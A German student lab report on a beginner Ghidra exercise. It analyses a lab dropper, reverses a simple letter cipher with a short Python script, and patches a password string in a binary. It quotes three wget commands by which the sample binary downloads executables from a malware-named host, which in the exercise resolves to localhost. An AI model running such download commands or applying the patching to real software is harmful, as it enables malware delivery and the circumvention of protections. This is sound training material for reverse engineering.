---
title: Ghidra for Beginners
author: Paul Nykiel
date: \today
---

# Einführung
Der `file` Befehl teilt einem mit, dass es sich um eine Executable (mit Debug Informationen) für x86-64 Linux handelt.

Beim ausführen werden drei neue Executables angelegt: `02_a`, `02_b` und `03`. Mit `strings 01` kann man herausfinden
woher die Dateien kommen, man findet drei `wget` Anweisungen:
```
wget -q http://malware.h4.xx0r/02_a
wget -q http://malware.h4.xx0r/02_b
wget -q http://malware.h4.xx0r/03
```
interessehalber kann auch herausgefunden werden was sich hinter `malware.h4.xx0r` versteckt, mit `dig` kann
der DNS-Eintrag aufgelöst werden, er zeigt auf Localhost. D.h. es läuft ein Webserver in der VM.

# Advanced
## Chiffre analysieren
Das Program akzeptiert zwei Argument mit jeweils genau 10 Zeichen länge. 
Das erste Argument wird transformiert und muss dann gleich dem zweiten Argument sein. 
Die Transformation erfordert, dass das Wort nur aus Buchstaben besteht, diese werden im ersten Schritt alle
zu Kleinbuchstaben umgewandelt. Im nächsten Schritt wird der ASCII-Wert jeden Buchstabens mit 10 Multipliziert und
Modulo `0x1A` gerechnet. Auf das Ergebnis wird dann der ASCII Wert von "a" addiert und dieses Ergebnis wird wieder
nach ASCII Interpretiert.

Um die Transformation schnell ausrechnen zu können wurde ein kleine Python Skript geschrieben:
```python
import sys

inp = sys.argv[1]
out = ""

for c in inp:
    asc = ((ord(c) * 10) % 0x1A) + ord('a')
    out += chr(asc) 

print(out)
```
dieses ergibt z.B. für den Text `aaaaaaaaaa` die Chiffre `iiiiiiiiii`. Diese wird vom Program auch als korrekt angenommen.

## Patchen
Das Passwort ist immer eine zufällige Permutation aller Zeichen eines Strings im Programmcode (der String ist 
initial `0123456789`). Durch Patchen des Strings (wie in der VL beschrieben) zu `0000000000` sind alle Passwörter
Permutationen von `0` also wieder `0000000000`.

# Fazit
In dieser Aufgabe wurden drei verschiedene Anwendungen analysiert und reverse-engineered. Hierbei wurde die Anwendung
von Ghidra geübt.

Zusammenfassend hat mir die Übung gefallen, sie hat einen einfachen Einstieg in Ghidra ermöglicht und einen Überblick
darüber gegeben was mit Ghidra möglich ist.


